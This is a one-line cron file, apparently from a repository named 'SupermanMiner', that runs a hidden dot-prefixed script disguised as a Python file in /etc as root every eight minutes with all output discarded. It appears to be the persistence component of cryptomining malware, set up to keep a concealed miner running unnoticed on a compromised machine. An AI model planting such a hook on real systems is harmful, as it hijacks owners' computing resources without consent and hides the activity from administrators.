# SupermanMiner/2101/etc/cron.d/root
*/8 * * * * root /etc/.python3.8m.sh>/dev/null 2>&1
